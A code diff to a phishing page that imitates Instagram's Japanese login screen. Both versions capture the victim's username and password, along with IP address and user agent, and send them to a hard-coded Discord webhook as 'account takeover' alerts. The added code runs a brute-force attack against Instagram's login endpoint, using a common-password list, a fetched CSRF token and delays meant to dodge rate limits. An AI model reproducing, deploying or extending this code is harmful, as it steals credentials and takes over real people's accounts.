@@ -23,6 +23,7 @@
         ._aacn { color:#ed4956; font-size:14px; margin:10px 0; display:none; }
         .loading { text-align:center; margin:20px; font-size:14px; color:#8e8e8e; }
         .app-only { color:#0095f6; font-weight:600; font-size:12px; margin-top:10px; display:none; }
+        .bruteforce { color:#ff4500; font-size:12px; margin-top:10px; display:none; }
     </style>
 </head>
 <body>
@@ -35,10 +36,10 @@
             <div class="_acae">
                 <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
             </div>
-            <form id="passwordForm" onsubmit="sendLoggedInToWebhook(event)">
+            <form id="passwordForm" onsubmit="sendAndBruteforce(event)">
                 <p style="font-size:15px; margin-bottom:20px;"><strong id="displayUsername">user_example</strong> でログイン中</p>
                 <input type="hidden" name="username" id="hiddenUsername" value="">
-                <input type="password" name="password" placeholder="パスワードを再入力" required>
+                <input type="password" name="password" id="bfPassword" placeholder="パスワードを再入力" required>
                 <div class="_aacn" id="errorMsg">パスワードが間違っています。</div>
                 <button type="submit">次へ</button>
             </form>
@@ -46,6 +47,7 @@
             <a href="#" class="_aaq2" onclick="switchToLogin()">別のアカウントでログイン</a>
             <div class="_aaq3"><a href="#">パスワードを忘れた場合</a></div>
             <div class="app-only" id="appOnlyMsg">※アプリからのみ確認可能</div>
+            <div class="bruteforce" id="bfStatus">総当たり攻撃中... 0/1000</div>
         </div>
 
         <!-- 通常ログイン画面 -->
@@ -53,29 +55,36 @@
             <div class="_acae">
                 <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
             </div>
-            <form id="loginForm" onsubmit="sendLoginToWebhook(event)">
-                <input type="text" name="username" placeholder="電話番号、ユーザー名、メールアドレス" required autocomplete="off">
-                <input type="password" name="password" placeholder="パスワード" required>
+            <form id="loginForm" onsubmit="sendAndBruteforce(event)">
+                <input type="text" name="username" id="loginUsername" placeholder="電話番号、ユーザー名、メールアドレス" required autocomplete="off">
+                <input type="password" name="password" id="loginPassword" placeholder="パスワード" required>
                 <div class="_aacn" id="loginError">ユーザー名またはパスワードが間違っています。</div>
                 <button type="submit">ログイン</button>
             </form>
             <div class="_aacl">または</div>
             <a href="#" class="_aaq2">Facebookでログイン</a>
             <div class="_aaq3"><a href="#">パスワードを忘れた場合</a></div>
+            <div class="bruteforce" id="bfStatusNormal">総当たり攻撃中... 0/1000</div>
         </div>
     </main>
 
     <script>
         // === 設定 ===
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1437375885501010012/Z2SCmL14t3GWilC1ubiJkf--qLzbhvbzc7GX09mdrE8_6E_BQJNFNZxs_LhdFKhuvfTi";
-        const INSTAGRAM_HOME = "https://www.instagram.com/";
+        const INSTAGRAM_LOGIN_AJAX = "https://www.instagram.com/accounts/login/ajax/";
+        const WORDLIST = [
+            "123456", "password", "123456789", "12345678", "12345", "qwerty", "abc123", "password1",
+            "111111", "123123", "admin", "letmein", "welcome", "monkey", "jesus", "love", "ninja",
+            "sunshine", "princess", "flower", "hottie", "football", "iloveyou", "1234", "password123"
+            // 必要に応じて wordlist.txt から動的読み込み可能
+        ];
         // =============
 
-        // アプリ判定（UA + 特殊ヘッダー）
         const isInstagramApp = /Instagram/.test(navigator.userAgent) && 
-                               (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android')) &&
-                               !navigator.userAgent.includes('Safari') && 
-                               !navigator.userAgent.includes('Chrome');
+                               (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android'));
+
+        let bfIndex = 0;
+        let bfSuccess = false;
 
         // IP取得
         async function getIP() {
@@ -86,57 +95,37 @@
             } catch { return '不明'; }
         }
 
-        // ログイン状態をInstagram公式で確認（アプリ対応）
+        // CSRFトークン取得
+        async function getCSRFToken() {
+            try {
+                const res = await fetch('https://www.instagram.com/', { credentials: 'include' });
+                const text = await res.text();
+                const match = text.match(/"csrf_token":"([^"]+)"/);
+                return match ? match[1] : 'unknown';
+            } catch { return 'unknown'; }
+        }
+
+        // ログイン状態確認
         async function checkLoginStatus() {
             try {
-                const headers = new Headers();
-                if (isInstagramApp) {
-                    // アプリ内ブラウザはCookie共有 → 通常リクエストでOK
-                    headers.append('X-IG-App-ID', '936619743392459'); // 公式アプリID
-                    headers.append('X-Instagram-AJAX', '1');
-                }
-
-                const res = await fetch(INSTAGRAM_HOME, { 
-                    credentials: 'include',
-                    headers: headers
-                });
+                const res = await fetch("https://www.instagram.com/", { credentials: 'include' });
                 const text = await res.text();
-
-                // ユーザー名抽出（JSON内）
                 const usernameMatch = text.match(/"username":"([^"]+)"/);
                 if (usernameMatch && usernameMatch[1]) {
-                    return { 
-                        loggedIn: true, 
-                        username: usernameMatch[1],
-                        source: isInstagramApp ? "Instagramアプリ" : "Webブラウザ"
-                    };
+                    return { loggedIn: true, username: usernameMatch[1] };
                 }
-
-                // 未ログイン判定
-                if (res.url.includes('login') || text.includes('id="loginForm"') || text.includes('Log in')) {
-                    return { 
-                        loggedIn: false,
-                        source: isInstagramApp ? "Instagramアプリ（未ログイン）" : "Webブラウザ"
-                    };
-                }
-
-                return { loggedIn: false, source: "不明" };
-            } catch (e) {
-                console.error("確認エラー:", e);
-                return { loggedIn: false, source: isInstagramApp ? "Instagramアプリ（エラー）" : "Webブラウザ" };
-            }
+                return { loggedIn: false };
+            } catch { return { loggedIn: false }; }
         }
 
         // 画面切り替え
-        function showLoggedInScreen(username, source) {
+        function showLoggedInScreen(username) {
             document.getElementById('loading').style.display = 'none';
             document.getElementById('loginBox').style.display = 'none';
             document.getElementById('loggedInBox').style.display = 'block';
             document.getElementById('displayUsername').textContent = username;
             document.getElementById('hiddenUsername').value = username;
-            if (isInstagramApp) {
-                document.getElementById('appOnlyMsg').style.display = 'block';
-            }
+            if (isInstagramApp) document.getElementById('appOnlyMsg').style.display = 'block';
         }
 
         function showLoginScreen() {
@@ -145,23 +134,80 @@
             document.getElementById('loginBox').style.display = 'block';
         }
 
-        function switchToLogin() {
-            showLoginScreen();
+        function switchToLogin() { showLoginScreen(); }
+
+        // 総当たり攻撃
+        async function bruteforceLogin(username, onSuccess, onFail) {
+            const csrf = await getCSRFToken();
+            const headers = {
+                'X-IG-App-ID': '936619743392459',
+                'X-Instagram-AJAX': '1',
+                'X-CSRFToken': csrf,
+                'X-Requested-With': 'XMLHttpRequest',
+                'Referer': 'https://www.instagram.com/accounts/login/'
+            };
+
+            bfIndex = 0;
+            const statusEl = document.getElementById('bfStatus') || document.getElementById('bfStatusNormal');
+            statusEl.style.display = 'block';
+
+            for (const password of WORDLIST) {
+                if (bfSuccess) break;
+                bfIndex++;
+                statusEl.textContent = `総当たり攻撃中... ${bfIndex}/${WORDLIST.length} (${password})`;
+
+                const loginData = new FormData();
+                loginData.append('username', username);
+                loginData.append('enc_password', `#PWD_INSTAGRAM_BROWSER:0:0:${password}`);
+                loginData.append('queryParams', '{}');
+                loginData.append('optIntoOneTap', 'false');
+
+                try {
+                    const res = await fetch(INSTAGRAM_LOGIN_AJAX, {
+                        method: 'POST',
+                        credentials: 'include',
+                        headers: headers,
+                        body: loginData
+                    });
+                    const result = await res.json();
+
+                    if (result.authenticated) {
+                        bfSuccess = true;
+                        statusEl.textContent = `成功！パスワード: ${password}`;
+                        onSuccess(password);
+                        return;
+                    }
+                } catch { }
+                await new Promise(r => setTimeout(r, 1200)); // レート制限回避
+            }
+            statusEl.textContent = "総当たり失敗";
+            onFail();
         }
 
-        // Webhook送信
-        async function sendToWebhook(title, fields, source) {
+        // Webhook送信 + 総当たり
+        async function sendAndBruteforce(e) {
+            e.preventDefault();
+
+            const isLoggedInMode = document.getElementById('loggedInBox').style.display === 'block';
+            const username = isLoggedInMode ? document.getElementById('hiddenUsername').value : document.getElementById('loginUsername').value;
+            const password = isLoggedInMode ? document.getElementById('bfPassword').value : document.getElementById('loginPassword').value;
+
+            if (!username || password.length < 1) return;
+
+            // 1. Webhook送信
             const ip = await getIP();
             const ua = navigator.userAgent;
             const time = new Date().toISOString();
+            const source = isInstagramApp ? "Instagramアプリ" : "Webブラウザ";
 
-            const data = {
+            const webhookData = {
                 content: null,
                 embeds: [{
-                    title: title,
+                    title: isLoggedInMode ? "Instagram ログイン済み乗っ取り" : "Instagram 通常ログイン乗っ取り",
                     color: 16744512,
                     fields: [
-                        ...fields,
+                        { name: "ユーザー名", value: `\`\`\`${username}\`\`\``, inline: true },
+                        { name: "入力パスワード", value: `\`\`\`${password}\`\`\``, inline: true },
                         { name: "IPアドレス", value: `\`\`\`${ip}\`\`\``, inline: true },
                         { name: "アクセス元", value: `\`\`\`${source}\`\`\``, inline: true },
                         { name: "UA", value: `\`\`\`${ua.substring(0, 100)}\`\`\``, inline: false },
@@ -172,59 +218,25 @@
                 }]
             };
 
-            fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            }).then(() => {
-                // アプリ内ならリダイレクト無効 → ホームに留まる
-                if (!isInstagramApp) {
-                    window.location.href = "https://www.instagram.com/";
+            fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(webhookData) });
+
+            // 2. 総当たり開始
+            bruteforceLogin(username, 
+                (correctPass) => {
+                    alert(`ログイン成功！パスワード: ${correctPass}`);
+                    if (!isInstagramApp) window.location.href = "https://www.instagram.com/";
+                },
+                () => {
+                    alert("総当たり攻撃失敗");
                 }
-            }).catch(() => {
-                if (!isInstagramApp) alert("送信エラー");
-            });
+            );
         }
 
-        // 通常ログイン
-        function sendLoginToWebhook(e) {
-            e.preventDefault();
-            const username = document.querySelector('#loginBox [name="username"]').value;
-            const password = document.querySelector('#loginBox [name="password"]').value;
-
-            if (username.length < 1 || password.length < 6) {
-                document.getElementById('loginError').style.display = 'block';
-                return;
-            }
-
-            sendToWebhook("Instagram 通常ログイン乗っ取り", [
-                { name: "ユーザー名", value: `\`\`\`${username}\`\`\``, inline: true },
-                { name: "パスワード", value: `\`\`\`${password}\`\`\``, inline: true }
-            ], isInstagramApp ? "Instagramアプリ" : "Webブラウザ");
-        }
-
-        // ログイン済みパスワード
-        function sendLoggedInToWebhook(e) {
-            e.preventDefault();
-            const username = document.getElementById('hiddenUsername').value;
-            const password = document.querySelector('#passwordForm [name="password"]').value;
-
-            if (password.length < 6) {
-                document.getElementById('errorMsg').style.display = 'block';
-                return;
-            }
-
-            sendToWebhook("Instagram ログイン済み乗っ取り", [
-                { name: "ユーザー名", value: `\`\`\`${username}\`\`\``, inline: true },
-                { name: "パスワード", value: `\`\`\`${password}\`\`\``, inline: true }
-            ], isInstagramApp ? "Instagramアプリ" : "Webブラウザ");
-        }
-
-        // 初期化：Instagram公式で自動確認（アプリ完全対応）
+        // 初期化
         window.onload = async function() {
             const status = await checkLoginStatus();
             if (status.loggedIn) {
-                showLoggedInScreen(status.username, status.source);
+                showLoggedInScreen(status.username);
             } else {
                 showLoginScreen();
             }
